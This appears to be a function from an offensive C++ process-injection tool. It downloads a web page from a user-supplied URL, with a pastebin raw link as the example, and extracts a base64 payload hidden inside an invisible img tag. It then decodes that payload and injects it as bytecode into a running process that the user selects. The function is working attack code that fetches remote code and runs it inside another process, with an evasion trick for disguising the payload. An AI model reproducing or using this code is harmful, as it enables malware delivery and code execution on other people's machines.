void cppInjectBytcodeFromWeb() {
	print("############################### EXAMPLES ###############################");
	print("# URL  : pastebin.com/raw/Nd1tCBv6                                     #");
	print("# Port : 80                                                            #");
	print("########################################################################");
	print("");
	std::string url = input("Enter URL");
	print("");
	std::string port = input("Enter port number");
	print("");
	if (url.length() < 1 || port.length() < 1) {
		print("Both parameters are required");
	} else if (!isPositiveNumber(port)) {
		print("Port number must be a positive number");
	} else {
		std::string data = getWebContent(url, atoi(port.c_str()));
		if (data.length() > 0) {
			// change the custom element here (make sure it is unique)
			// make sure to enclose the payload from both front and back
			std::string element = "<img class=\"bc\" src=\"data:image/gif;base64,payload\" alt=\"bc\" hidden=\"hidden\">";
			// change the payload placeholder here (make sure it is unique within the elemenet)
			std::string placeholder = "payload";
			std::string payload = extractPayload(data, element, placeholder);
			if (payload.length() > 0) {
				print("");
				// change the payload decoder here or just omit it
				payload = base64_decode(payload);
				int pid = chooseProcess();
				if (pid != -1) {
					injectBytecode(pid, payload);
				}
			}
		}
	}
}

